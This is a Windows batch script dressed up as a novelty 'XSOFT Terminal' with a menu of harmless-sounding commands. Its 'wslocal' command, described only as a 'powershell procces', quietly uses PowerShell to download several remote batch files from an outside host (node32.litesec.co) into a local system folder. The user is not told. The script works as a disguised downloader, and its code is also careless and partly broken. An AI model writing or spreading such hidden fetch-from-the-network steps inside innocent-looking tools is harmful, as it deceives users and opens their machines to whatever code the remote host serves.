cls
@echo off
:cons
color 7
)
cls
set comm=
title DFCI
echo.
ECHO.
ECHO.
echo                                                                                     ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
echo                                                                                      บ   Welcome to the XSOFT Terminal. type /? for commands  บ    
echo                                                                                      ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
echo.
set /p comm=:::::ภฤþ 
echo.
if "%comm%"=="exit" exit
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help /
if "%comm%"=="emulator" goto emy
if "%comm%"=="telnet" telnet
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror
if not "%comm%"=="emulator" goto consolerror

                         

:consolerror
echo                                                                                 '%comm%' is not an external command, batch script or device.
set /p comm=:::::ภฤþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror


:help
echo                                                                                 HELP=====================
echo commands:
echo.
echo v                                                                               exit = exit the terminal.
echo                                                                                  getnet = server info.
echo                                                                                  win = nothing just a text that says that's not ms-dos.
echo                                                                                 wslocal = powershell procces.
echo                                                                                 diros = hiddden directories.
echo                                                                                 help or HELP or help /? or /? = goes you to this menu.
echo.
set /p comm=:::::ภฤþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror

:getip
getmac
set /p comm=:::::ภฤþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror

:dir
echo                                                                                     VOLUME (DIRECTORYES FROM W DRIVE)
DIR
echo                                                                                     DIRECTORY ON SYSTEM
set /p comm=:::::ภฤþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror

:bruh
echo                                                                                 This is not MS-DOS..
set /p comm=:::::ภฤþ 
echo.
if "%comm%"=="exit" goto :eof
if "%comm%"=="getnet" goto getip
if "%comm%"=="win" goto bruh
if "%comm%"=="wslocal" goto powershh
if "%comm%"=="diros" goto dir
if "%comm%"=="help" goto help
if "%comm%"=="HELP" goto help
if "%comm%"=="help /?" goto help
if "%comm%"=="/?" goto help
if "%comm%"=="" goto consolerror
if "%comm:~0,1%"==" " goto consolerror
if "%comm:~0,1%"=="/" goto consolerror
if "%comm:~0,1%"=="^|" goto consolerror
if "%comm:~0,1%"=="\" goto consolerror
if "%comm:~0,1%"=="?" goto consolerror
if not "%comm%"=="exit" goto consolerror
if not "%comm%"=="getnet" goto consolerror
if not "%comm%"=="win" goto consolerror
if not "%comm%"=="wslocal" goto consolerror
if not "%comm%"=="diros" goto consolerror

:powershh
echo PROCCCES ON phowershell.exe...
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://node32.litesec.co/neomemory.bat', 'system\neomemory.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://node32.litesec.co/dll.bat', 'system\neomemory.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://node32.litesec.co/sys.bat', 'system\neomemory.bat')"
)
(
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://node32.litesec.co/neomemory.bat', 'system\neomemory.bat')"
pause>nul
goto cons